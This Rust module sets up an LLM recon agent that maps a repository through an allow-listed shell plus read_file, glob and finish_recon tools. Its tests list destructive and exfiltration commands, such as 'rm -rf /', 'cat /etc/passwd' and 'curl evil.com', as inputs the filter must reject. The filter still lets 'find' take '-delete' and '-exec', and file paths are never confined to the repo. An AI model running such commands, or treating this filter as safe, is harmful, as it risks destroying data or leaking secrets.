//! Phase 1: Recon Agent — build structured `RepoMap` before the walk begins.
//!
//! Runs before the TUI starts. The model is given shell, read_file, glob, and
//! finish_recon tools. When it calls finish_recon, we capture the RepoMap and
//! pass it into the walk agent's first prompt as context.
//!
//! Gated via `#[cfg(feature = "meerkat")]` in mod.rs — zero impact on base build.

#![allow(dead_code)]

use std::{
    path::PathBuf,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc,
    },
};

use async_trait::async_trait;
use meerkat::{
    AgentBuilder, AgentFactory, AgentToolDispatcher, JsonlStore, LlmClient, ToolDef, ToolError,
    ToolResult,
};
use meerkat_core::types::{ContentInput, ToolCallView};
use meerkat_store::StoreAdapter;
use serde::Deserialize;
use serde_json::json;
use tokio::sync::Mutex;

use super::meerkat_spike::OpenRouterChatClient;
use super::types::{ApiConfig, ApiProvider, RepoMap};

/// Hard limits for the recon agent (separate from deep-audit budget).
const RECON_MAX_TOOL_CALLS: usize = 30;
const RECON_MAX_WALL_SECS: u64 = 120;

// ── Shell allow-list ──────────────────────────────────────────────────────────

/// Returns true only for commands in the explicit allow-list.
/// Blocks shell metacharacters that enable injection or chaining.
fn is_shell_command_allowed(cmd: &str) -> bool {
    if cmd.contains('|') || cmd.contains(';') || cmd.contains('&')
        || cmd.contains('`') || cmd.contains("$(")
    {
        return false;
    }
    let parts: Vec<&str> = cmd.trim().split_whitespace().collect();
    match parts.as_slice() {
        ["git", "log", ..] => true,
        ["git", "diff", ..] => true,
        ["find", ..] => true,
        ["wc", "-l", ..] => true,
        _ => false,
    }
}

// ── ReconDispatcher ───────────────────────────────────────────────────────────

struct ReconDispatcher {
    repo_path: PathBuf,
    result: Arc<Mutex<Option<RepoMap>>>,
    tool_calls: Arc<AtomicUsize>,
    max_tool_calls: usize,
}

#[async_trait]
impl AgentToolDispatcher for ReconDispatcher {
    fn tools(&self) -> Arc<[Arc<ToolDef>]> {
        vec![
            Arc::new(ToolDef {
                name: "shell".to_string(),
                description: "Run an allow-listed shell command (git log, git diff, find, wc -l). \
                              Returns stdout. Pipes, semicolons, and shell operators are rejected."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {
                        "command": { "type": "string", "description": "The command to run" }
                    },
                    "required": ["command"]
                }),
            }),
            Arc::new(ToolDef {
                name: "read_file".to_string(),
                description: "Read a file from the repository. Path is relative to the repo root."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {
                        "path": { "type": "string", "description": "Relative file path" }
                    },
                    "required": ["path"]
                }),
            }),
            Arc::new(ToolDef {
                name: "glob".to_string(),
                description: "Find files matching a glob pattern (e.g. 'src/**/*.rs', '**/*.toml')."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {
                        "pattern": { "type": "string", "description": "Glob pattern relative to repo root" }
                    },
                    "required": ["pattern"]
                }),
            }),
            Arc::new(ToolDef {
                name: "finish_recon".to_string(),
                description: "Call this when your analysis is complete. Provide the complete repository map."
                    .to_string(),
                input_schema: json!({
                    "type": "object",
                    "properties": {
                        "entry_points": {
                            "type": "array",
                            "items": { "type": "string" },
                            "description": "Files that are clear entry points (e.g. src/main.rs, index.ts)"
                        },
                        "key_modules": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "path": { "type": "string" },
                                    "purpose": { "type": "string" },
                                    "key_exports": { "type": "array", "items": { "type": "string" } },
                                    "depends_on": { "type": "array", "items": { "type": "string" } }
                                },
                                "required": ["path", "purpose", "key_exports", "depends_on"]
                            }
                        },
                        "dependency_edges": {
                            "type": "array",
                            "items": {
                                "type": "array",
                                "items": { "type": "string" },
                                "minItems": 2,
                                "maxItems": 2
                            },
                            "description": "Import edges as [[from, to], ...] pairs"
                        },
                        "recent_changes": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "hash": { "type": "string" },
                                    "message": { "type": "string" },
                                    "date": { "type": "string" }
                                },
                                "required": ["hash", "message", "date"]
                            }
                        },
                        "estimated_complexity": {
                            "type": "string",
                            "enum": ["Low", "Medium", "High"]
                        },
                        "suggested_walk_order": {
                            "type": "array",
                            "items": { "type": "string" },
                            "description": "Recommended file order for the walkthrough"
                        },
                        "repo_stats": {
                            "type": "object",
                            "properties": {
                                "file_count": { "type": "integer" },
                                "approx_loc": { "type": "integer" }
                            },
                            "required": ["file_count", "approx_loc"]
                        }
                    },
                    "required": ["entry_points", "key_modules", "dependency_edges",
                                 "recent_changes", "estimated_complexity",
                                 "suggested_walk_order", "repo_stats"]
                }),
            }),
        ]
        .into()
    }

    async fn dispatch(&self, call: ToolCallView<'_>) -> Result<ToolResult, ToolError> {
        // Enforce tool-call budget. Always allow finish_recon through.
        if call.name != "finish_recon" {
            let prev = self.tool_calls.fetch_add(1, Ordering::SeqCst);
            if prev >= self.max_tool_calls {
                return Ok(ToolResult::new(
                    call.id.to_string(),
                    "BUDGET_EXCEEDED: tool call limit reached. \
                     You must call finish_recon immediately with whatever you have gathered so far."
                        .to_string(),
                    true,
                ));
            }
        }

        match call.name {
            "shell" => {
                #[derive(Deserialize)]
                struct Args {
                    command: String,
                }
                let args: Args = call
                    .parse_args::<Args>()
                    .map_err(|e: serde_json::Error| ToolError::invalid_arguments("shell", e.to_string()))?;

                if !is_shell_command_allowed(&args.command) {
                    return Ok(ToolResult::new(
                        call.id.to_string(),
                        format!("Denied: '{}' is not in the allow-list. Allowed: git log, git diff, find, wc -l.", args.command),
                        true,
                    ));
                }

                let output = std::process::Command::new("sh")
                    .arg("-c")
                    .arg(&args.command)
                    .current_dir(&self.repo_path)
                    .output()
                    .map_err(|e| ToolError::invalid_arguments("shell", e.to_string()))?;

                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let text = if stderr.trim().is_empty() {
                    stdout.into_owned()
                } else {
                    format!("{}\nSTDERR: {}", stdout, stderr)
                };
                Ok(ToolResult::new(call.id.to_string(), text, false))
            }

            "read_file" => {
                #[derive(Deserialize)]
                struct Args {
                    path: String,
                }
                let args: Args = call
                    .parse_args::<Args>()
                    .map_err(|e: serde_json::Error| ToolError::invalid_arguments("read_file", e.to_string()))?;
                let path = self.repo_path.join(&args.path);
                let content = std::fs::read_to_string(&path).map_err(|e| {
                    ToolError::invalid_arguments(
                        "read_file",
                        format!("cannot read {}: {e}", path.display()),
                    )
                })?;
                Ok(ToolResult::new(call.id.to_string(), content, false))
            }

            "glob" => {
                #[derive(Deserialize)]
                struct Args {
                    pattern: String,
                }
                let args: Args = call
                    .parse_args::<Args>()
                    .map_err(|e: serde_json::Error| ToolError::invalid_arguments("glob", e.to_string()))?;
                let pattern_path = self.repo_path.join(&args.pattern);
                let pattern_str = pattern_path.to_string_lossy().into_owned();
                let matches: Vec<String> = glob::glob(&pattern_str)
                    .map_err(|e| ToolError::invalid_arguments("glob", e.to_string()))?
                    .filter_map(|r| r.ok())
                    .filter_map(|p| {
                        p.strip_prefix(&self.repo_path)
                            .ok()
                            .map(|rel| rel.to_string_lossy().into_owned())
                    })
                    .take(100)
                    .collect();
                Ok(ToolResult::new(call.id.to_string(), matches.join("\n"), false))
            }

            "finish_recon" => {
                let raw: serde_json::Value = call
                    .parse_args::<serde_json::Value>()
                    .map_err(|e: serde_json::Error| ToolError::invalid_arguments("finish_recon", e.to_string()))?;
                match serde_json::from_value::<RepoMap>(raw) {
                    Ok(repo_map) => {
                        *self.result.lock().await = Some(repo_map);
                        Ok(ToolResult::new(call.id.to_string(), "Recon complete.".to_string(), false))
                    }
                    Err(e) => Ok(ToolResult::new(
                        call.id.to_string(),
                        format!("Schema error — fix the structure and retry: {e}"),
                        true,
                    )),
                }
            }

            other => Err(ToolError::not_found(other)),
        }
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Run the recon agent against `repo_path`. Returns a `RepoMap` or an error.
/// Caller should fall back to legacy behavior on error.
pub async fn run_recon(
    api_config: &ApiConfig,
    repo_path: &std::path::Path,
    max_tokens_per_turn: u32,
) -> Result<RepoMap, Box<dyn std::error::Error>> {
    let (api_key, base_url) = match &api_config.provider {
        ApiProvider::OpenRouter { api_key, base_url } => (api_key.as_str(), base_url.as_str()),
        ApiProvider::Anthropic { .. } => {
            return Err("Recon agent requires OpenRouter (Anthropic not yet supported)".into());
        }
    };

    let tmp = tempfile::TempDir::new()?;
    let factory = AgentFactory::new(tmp.path().to_path_buf());

    let client: Arc<dyn LlmClient> = Arc::new(OpenRouterChatClient::new(api_key, base_url));
    let llm = factory.build_llm_adapter(client, &api_config.model).await;
    let store = Arc::new(StoreAdapter::new(Arc::new(JsonlStore::new(factory.store_path.clone()))));

    let result_cell: Arc<Mutex<Option<RepoMap>>> = Arc::new(Mutex::new(None));
    let tool_call_counter = Arc::new(AtomicUsize::new(0));
    let dispatcher = Arc::new(ReconDispatcher {
        repo_path: repo_path.to_path_buf(),
        result: Arc::clone(&result_cell),
        tool_calls: Arc::clone(&tool_call_counter),
        max_tool_calls: RECON_MAX_TOOL_CALLS,
    }) as Arc<dyn AgentToolDispatcher>;

    let system_prompt = format!(
        "You are a code repository analyst. Map this codebase before a walkthrough begins.\n\
         Use the provided tools, then call finish_recon with your complete findings.\n\
         \n\
         Follow this order:\n\
         1. Read Cargo.toml / package.json / go.mod to identify project type\n\
         2. Run 'git log --oneline -20' for recent history\n\
         3. Glob for entry points: src/main.rs, src/lib.rs, index.ts, main.go, etc.\n\
         4. Read 1-3 entry point files to understand structure and imports\n\
         5. Read key imported modules to map dependencies\n\
         6. Call finish_recon with complete analysis\n\
         \n\
         Be thorough but efficient. Aim for 5-10 tool calls before finish_recon.\n\
         Repo: {}",
        repo_path.display()
    );

    let mut agent = AgentBuilder::new()
        .model(&api_config.model)
        .system_prompt(&system_prompt)
        .max_tokens_per_turn(max_tokens_per_turn)
        .build(Arc::new(llm), dispatcher, store)
        .await;

    let run_result = tokio::time::timeout(
        std::time::Duration::from_secs(RECON_MAX_WALL_SECS),
        agent.run(ContentInput::Text(
            "Map this repository. Use the tools, then call finish_recon.".to_string(),
        )),
    )
    .await;

    match run_result {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => eprintln!("Warning: recon agent error: {e}"),
        Err(_) => eprintln!(
            "Warning: recon timed out after {}s, using partial results.",
            RECON_MAX_WALL_SECS
        ),
    }

    // tmp lives until here — store is valid for the agent run
    drop(tmp);

    let repo_map = result_cell.lock().await.take();
    repo_map.ok_or_else(|| -> Box<dyn std::error::Error> {
        "Recon agent completed without calling finish_recon".into()
    })
}

/// Write the RepoMap to `~/.config/gist/sessions/<timestamp>-<repo>-recon.json`.
pub fn save_recon_log(repo_map: &RepoMap, repo_path: &std::path::Path) {
    let sessions_dir = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("gist")
        .join("sessions");
    let _ = std::fs::create_dir_all(&sessions_dir);

    let ts = chrono::Local::now().format("%Y%m%d-%H%M%S");
    let slug = repo_path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "repo".to_string());
    let filename = format!("{ts}-{slug}-recon.json");

    if let Ok(json) = serde_json::to_string_pretty(repo_map) {
        let _ = std::fs::write(sessions_dir.join(filename), json);
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::codewalk::types::{Complexity, RepoStats};

    #[test]
    fn shell_allow_list_accepts_valid_commands() {
        assert!(is_shell_command_allowed("git log --oneline -20"));
        assert!(is_shell_command_allowed("git diff --stat HEAD~5"));
        assert!(is_shell_command_allowed("find . -name '*.rs'"));
        assert!(is_shell_command_allowed("wc -l src/main.rs"));
    }

    #[test]
    fn shell_allow_list_rejects_dangerous_commands() {
        assert!(!is_shell_command_allowed("rm -rf /"));
        assert!(!is_shell_command_allowed("cat /etc/passwd"));
        assert!(!is_shell_command_allowed("git push --force"));
        assert!(!is_shell_command_allowed("find . | rm -rf /"));
        assert!(!is_shell_command_allowed("git log; rm -rf /"));
        assert!(!is_shell_command_allowed("git log && curl evil.com"));
        assert!(!is_shell_command_allowed("$(curl evil.com)"));
    }

    #[test]
    fn repo_map_roundtrips_serde() {
        let map = RepoMap {
            entry_points: vec!["src/main.rs".to_string()],
            key_modules: vec![],
            dependency_edges: vec![("src/main.rs".to_string(), "src/lib.rs".to_string())],
            recent_changes: vec![],
            estimated_complexity: Complexity::Low,
            suggested_walk_order: vec!["src/main.rs".to_string(), "src/lib.rs".to_string()],
            repo_stats: RepoStats { file_count: 10, approx_loc: 500 },
        };
        let json = serde_json::to_string(&map).unwrap();
        let back: RepoMap = serde_json::from_str(&json).unwrap();
        assert_eq!(back.entry_points[0], "src/main.rs");
        assert_eq!(back.dependency_edges[0].0, "src/main.rs");
    }

    #[test]
    fn recon_dispatcher_exposes_four_tools() {
        let d = ReconDispatcher {
            repo_path: PathBuf::from("."),
            result: Arc::new(Mutex::new(None)),
            tool_calls: Arc::new(AtomicUsize::new(0)),
            max_tool_calls: RECON_MAX_TOOL_CALLS,
        };
        let tools = d.tools();
        assert_eq!(tools.len(), 4);
        let names: Vec<&str> = tools.iter().map(|t| t.name.as_str()).collect();
        assert!(names.contains(&"shell"));
        assert!(names.contains(&"read_file"));
        assert!(names.contains(&"glob"));
        assert!(names.contains(&"finish_recon"));
    }
}
